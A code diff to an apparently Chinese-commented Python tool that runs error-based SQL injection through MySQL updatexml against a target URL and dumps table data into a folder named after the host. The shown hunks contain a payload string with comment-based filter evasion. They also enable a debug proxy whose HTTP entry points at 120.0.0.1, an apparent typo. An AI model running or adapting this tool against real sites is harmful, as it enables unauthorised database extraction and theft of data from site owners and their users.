@@ -16,7 +16,7 @@ import os
 from urllib.parse import urlparse
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-# proxies = {'http': 'http://120.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
+proxies = {'http': 'http://120.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
 
 
 def get_header(url):
@@ -50,18 +50,22 @@ def post_header(file, httpssl):
     Returns:
         [string]: [返回请求方法，URL，请求头，post参数]
     """
-    fo = open(file, 'r')
-    req_header = fo.readlines()
-    fo.close()
-    req_base = req_header[0].strip('\n').split(' ') #请求包第一行，获取method，url
-    req_method = req_base[0] #method
-    req_url = req_base[1] #url
-    headers = {}
-    for i in req_header[1:-2]:
-        header_key = i.strip('\n').split(': ')
-        headers[header_key[0]] = header_key[1]  #处理header
-    para = req_header[-1] # post参数
-    req_url = httpssl  + '://' + headers['Host'] + req_url
+    if httpssl:
+        fo = open(file, 'r')
+        req_header = fo.readlines()
+        fo.close()
+        req_base = req_header[0].strip('\n').split(' ') #请求包第一行，获取method，url
+        req_method = req_base[0] #method
+        req_url = req_base[1] #url
+        headers = {}
+        for i in req_header[1:-2]:
+            header_key = i.strip('\n').split(': ')
+            headers[header_key[0]] = header_key[1]  #处理header
+        para = req_header[-1] # post参数
+        req_url = httpssl  + '://' + headers['Host'] + req_url
+    else:
+        print('Error: 请使用-s参数指定是http还是https!')
+        os._exit(0)
     return req_method, req_url, headers, para
 
 def str_to_hexStr(string):
@@ -148,7 +152,7 @@ class udpatexml_get():
             get_para = self.sql_para(sql_select)
             urls_cut = urlparse(self.url)
             urls = urls_cut.scheme + '://' + urls_cut.netloc + urls_cut.path + '?' + get_para
-            res = requests.get(url=urls, headers=self.headers, verify=False)
+            res = requests.get(url=urls, headers=self.headers, verify=False,proxies=proxies)
             res.encoding = 'utf-8'
         req_res = res.text
         return req_res
@@ -271,8 +275,11 @@ class udpatexml_get():
             list: 返回数据列表
         """        
         print('start data')
-        dirpath = urlparse(self.url) 
-        os.mkdir(dirpath.netloc)  #创建文件夹存放数据，文件夹名是hostname
+        dirpath = urlparse(self.url)
+        if os.path.exists(dirpath.netloc):
+            pass
+        else:
+            os.mkdir(dirpath.netloc)  #创建文件夹存放数据，文件夹名是hostname
         data_total = [] # 全部数据
         data = {} # 单条数据
         sql_data = r'%20and%20(updatexml(1,concat(0x7e,(select/**/count(*)/*!11440from*//**/{}%20limit%200,1),0x7e),1))--%20+%23'.format(tablename)
@@ -353,11 +360,8 @@ if __name__ == "__main__":
         if args.url:
             method, url, header, para = get_header(args.url)
             header['Cookie'] = args.cookie
-        if args.file and args.protocol:
+        if args.file:
             method, url, header, para = post_header(args.file, args.protocol)
-        else:
-            print('Error: 请使用-s参数指定是http还是https!')
-            os._exit(0)
         data = udpatexml_get(url, method, para, header, args.parameter)
         if args.current:
             data.get_database()
